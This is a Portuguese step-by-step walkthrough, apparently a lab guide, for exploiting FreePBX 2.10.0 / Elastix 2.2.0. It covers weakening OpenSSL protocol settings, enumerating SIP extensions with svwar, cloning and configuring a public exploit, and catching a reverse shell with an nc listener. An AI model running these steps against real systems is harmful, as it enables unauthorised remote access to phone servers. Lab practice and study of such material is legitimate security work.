# FreePBX 2.10.0 | Elastix 2.2.0 - Remote Code Execution

No Kali, abra o arquivo de configuração do OpenSSL:
```
mousepad /etc/ssl/openssl.cnf
```
No final, comente o MinProtocol, CipherString e inclua uma configuração menos segura (temporariamente). Ficando dessa forma:
```
[system_default_sect]
# MinProtocol = TLSv1.2
MinProtocol = None # remover depois

# CipherString = DEFAULT:@SECLEVEL=2
CipherString = None # remover depois
```

Instale o Sipvicious, pois precisaremos do utilitário **svwar** para a exploração:
```
apt install sipvicious
```
*SIPVicious OSS é um conjunto de ferramentas de segurança que podem ser usadas para auditar sistemas VoIP baseados em SIP. Especificamente, ele permite que você encontre servidores SIP, enumere extensões SIP e quebre senhas.*

Execute o comando abaixo informando o IP do target. Procure pela Extension definida como "reqauth", neste caso, é a extensão 238:
```
svwar -m INVITE -e100-300 192.168.10.152
```
![image](https://user-images.githubusercontent.com/76706456/222012396-e0d01a61-cebe-4b9e-bfb9-efd9bb279ef5.png)

Baixe o exploit:
```
git clone https://github.com/d3fudd/FreePBX-2.10.0-Elastix-2.2.0-Remote-Code-Execution
```

Modifique o exploit informando o IP do target, IP do Kali, porta listener e número da extensão identificada na etapa anterior:
```
cd FreePBX-2.10.0-Elastix-2.2.0-Remote-Code-Execution/
```
```
mousepad exploit.py
```
![image](https://user-images.githubusercontent.com/76706456/222012106-07153622-069e-45d9-aeb7-809edfc39c80.png)

Salve o script e abra a porta 8081/TCP no Kali:
```
rlwrap nc -vnlp 8081
```

Execute o exploit:
```
python2 exploit.py
```

Observe que foi obtido reverse shell:

![image](https://user-images.githubusercontent.com/76706456/222012214-4a1730af-10ff-4864-b5a7-e58333a8a334.png)
